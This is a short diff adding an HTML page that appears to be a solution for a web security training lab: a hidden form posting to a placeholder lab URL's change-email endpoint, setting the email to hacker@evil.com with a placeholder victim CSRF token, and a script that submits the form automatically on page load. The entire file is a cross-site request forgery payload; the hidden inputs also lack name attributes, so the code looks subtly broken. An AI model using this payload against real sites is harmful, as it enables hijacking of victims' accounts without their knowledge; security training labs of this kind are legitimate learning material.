@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <form
+      action="https://YOUR_LAB_ID.web-security-academy/my-account/change-email"
+      method="post"
+    >
+      <input type="hidden" value="hacker@evil.com" />
+      <input type="hidden" value="VICTIMS_CSRF_TOKEN" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+<script>
+  document.forms[0].submit();
+</script>
